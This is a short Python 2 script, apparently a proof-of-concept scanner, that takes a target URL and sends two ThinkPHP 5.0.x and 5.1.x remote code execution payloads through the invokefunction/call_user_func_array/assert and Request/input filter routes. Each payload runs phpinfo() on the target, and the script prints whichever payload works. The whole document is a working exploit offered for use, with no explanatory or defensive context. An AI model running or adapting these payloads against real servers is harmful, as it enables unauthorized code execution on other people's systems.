# -*- coding:utf-8 -*-
import requests
import argparse
import sys

url = sys.argv[1]
def think(url):
	poc = r"/public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()"
	payload = url + poc
	r = requests.get(payload)
	if 'Version' in r.text:
		print "Think php 5.0.X payload" + "\n" + payload
		exit()
	else:
		print "Think php 5.0.x There is no,Take the next step Think php 5.1x"
def think2(url):
	poc = r"/public/index.php?s=index/\think\Request/input&filter=phpinfo&data=1"
	payload = url + poc
	r = requests.get(payload)
	if 'Version' in r.text:
		print "Think php 5.1.X payload" + "\n" + payload
	else:
		print "Think php 5.1.x There is no.sorry"
def all(url):
	think(url)
	think2(url)
if __name__ == '__main__':
	all(url)
